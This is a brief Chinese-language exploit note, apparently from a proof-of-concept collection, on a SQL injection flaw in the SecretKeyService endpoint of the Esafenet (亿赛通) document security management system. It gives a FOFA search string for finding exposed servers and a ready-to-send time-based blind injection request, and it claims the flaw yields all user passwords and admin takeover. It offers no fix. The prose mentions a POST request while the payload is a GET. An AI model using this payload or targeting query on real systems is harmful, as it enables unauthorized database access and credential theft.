# 亿赛通电子文档安全管理系统SecretKeyService存在SQL注入漏洞

亿赛通电子文档安全管理系统的 SecretKeyService接口存在 SQL 注入漏洞。 攻击者可以通过构造特定的 POST 请求注入恶意 SQL 代码，利用该漏洞对数据库执行任意 SQL 操作，获取所有用户的账户密码信息，破解md5值后可直接接管后台，导致系统处于极不安全的状态。

## fofa

```java
body="/CDGServer3/index.jsp"
```

## poc

```java
GET /CDGServer3/SecretKeyService?command=sameKeyName&keyName=1'+WAITFOR+DELAY+'0:0:5'--+ HTTP/1.1
Host: your-ip
```

![亿赛通电子文档安全管理系统 SecretKeyService SQL注入漏洞](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408122206511.png)